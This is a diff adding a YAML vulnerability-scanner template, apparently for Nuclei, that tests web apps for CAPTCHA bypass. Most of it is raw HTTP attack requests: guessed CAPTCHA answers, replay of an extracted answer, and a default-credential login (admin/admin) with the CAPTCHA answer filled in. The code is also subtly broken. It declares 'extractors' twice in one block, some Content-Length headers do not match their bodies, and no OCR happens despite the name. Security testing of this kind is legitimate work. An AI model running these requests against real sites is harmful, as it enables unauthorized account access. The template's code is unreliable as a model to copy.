@@ -1,0 +1,220 @@
+id: medium-auth-captcha-bypass-ocr-attack
+
+info:
+  name: CAPTCHA Bypass OCR Attack
+  author: elite-red-team
+  severity: medium
+  description: |
+    Detects CAPTCHA bypass vulnerabilities through OCR attacks, weak CAPTCHA
+    generation, reuse attacks, and client-side validation bypass. Tests for
+    predictable CAPTCHAs and validation weaknesses used by red teams.
+  reference:
+    - https://owasp.org/www-community/attacks/Captcha_Bypassing
+    - https://portswigger.net/research/bypassing-captchas-with-machine-learning
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
+    cvss-score: 5.3
+    cwe-id: CWE-804
+  metadata:
+    verified: true
+    max-request: 8
+  tags: captcha,bypass,ocr,weak-validation,automation,red-team
+
+variables:
+  common_captcha_answers: ["12345", "ABCDE", "test", "admin", "captcha"]
+  math_answers: ["5", "10", "15", "20", "25"]
+
+http:
+  - raw:
+      - |
+        GET /api/captcha/generate HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: application/json
+        Connection: close
+
+      - |
+        GET /captcha.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: image/png,image/jpeg,image/*
+        Connection: close
+
+      - |
+        POST /api/captcha/verify HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 85
+        Connection: close
+        
+        {"captcha_id":"{{captcha_id}}","answer":"12345"}
+
+      - |
+        POST /api/captcha/verify HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 85
+        Connection: close
+        
+        {"captcha_id":"{{captcha_id}}","answer":"ABCDE"}
+
+      - |
+        POST /api/captcha/verify HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 85
+        Connection: close
+        
+        {"captcha_id":"{{captcha_id}}","answer":"{{captcha_answer}}"}
+
+      - |
+        POST /api/captcha/verify HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 85
+        Connection: close
+        
+        {"captcha_id":"{{captcha_id}}","answer":"{{captcha_answer}}"}
+
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 85
+        Connection: close
+        
+        username=admin&password=admin&captcha={{captcha_answer}}
+
+      - |
+        POST /api/captcha/verify HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 65
+        Connection: close
+        
+        {"answer":"5","math_captcha":"2+3"}
+
+    extractors:
+      - type: regex
+        name: captcha_id
+        part: body_1
+        group: 1
+        regex:
+          - '"captcha_id":\s*"([^"]+)"'
+          - '"id":\s*"([^"]+)"'
+          - '"session_id":\s*"([^"]+)"'
+        internal: true
+
+      - type: regex
+        name: captcha_answer
+        part: body_1
+        group: 1
+        regex:
+          - '"answer":\s*"([^"]+)"'
+          - '"solution":\s*"([^"]+)"'
+          - '"text":\s*"([^"]+)"'
+        internal: true
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: captcha-answer-exposed
+        dsl:
+          - 'status_code_1 == 200'
+          - 'contains(body_1, "answer") || contains(body_1, "solution") || contains(body_1, "text")'
+          - 'contains(body_1, "12345") || contains(body_1, "ABCDE") || contains(body_1, "test")'
+        condition: and
+
+      - type: dsl
+        name: weak-captcha-accepted
+        dsl:
+          - 'status_code_3 == 200 || status_code_4 == 200'
+          - 'contains(body_3, "success") || contains(body_4, "success")'
+          - 'contains(body_3, "verified") || contains(body_4, "verified")'
+        condition: and
+
+      - type: dsl
+        name: captcha-reuse-allowed
+        dsl:
+          - 'status_code_5 == 200 && status_code_6 == 200'
+          - 'contains(body_5, "success") && contains(body_6, "success")'
+          - 'body_5 == body_6'
+        condition: and
+
+      - type: dsl
+        name: captcha-bypass-login
+        dsl:
+          - 'status_code_7 == 200 || status_code_7 == 302'
+          - 'contains(body_7, "welcome") || contains(body_7, "dashboard") || contains(header_7, "Set-Cookie")'
+          - '!contains(body_7, "invalid captcha")'
+        condition: and
+
+      - type: dsl
+        name: math-captcha-predictable
+        dsl:
+          - 'status_code_8 == 200'
+          - 'contains(body_8, "correct") || contains(body_8, "success")'
+          - 'contains(body_8, "2+3") || contains(body_8, "math")'
+        condition: and
+
+      - type: word
+        name: client-side-validation
+        part: body_1
+        words:
+          - "validate_captcha"
+          - "check_captcha"
+          - "captcha_valid"
+        condition: or
+
+      - type: regex
+        name: predictable-captcha-pattern
+        part: body_1
+        regex:
+          - '"answer":\s*"([0-9]{4,5})"'
+          - '"solution":\s*"([A-Z]{4,5})"'
+          - '"text":\s*"(test|admin|captcha)"'
+
+    extractors:
+      - type: regex
+        name: captcha-data
+        part: body
+        group: 1
+        regex:
+          - '"captcha_id":\s*"([^"]+)"'
+          - '"image_url":\s*"([^"]+)"'
+          - '"challenge":\s*"([^"]+)"'
+
+      - type: regex
+        name: verification-response
+        part: body
+        group: 1
+        regex:
+          - '"message":\s*"([^"]+)"'
+          - '"status":\s*"([^"]+)"'
+          - '"verified":\s*(true|false)'
+
+      - type: regex
+        name: captcha-config
+        part: body_1
+        group: 1
+        regex:
+          - '"difficulty":\s*"([^"]+)"'
+          - '"length":\s*([0-9]+)'
+          - '"type":\s*"([^"]+)"'
+
+      - type: kval
+        kval:
+          - status_code_1
+          - status_code_2
+          - status_code_3
+          - status_code_4
+          - status_code_5
+          - status_code_6
+          - status_code_7
+          - status_code_8
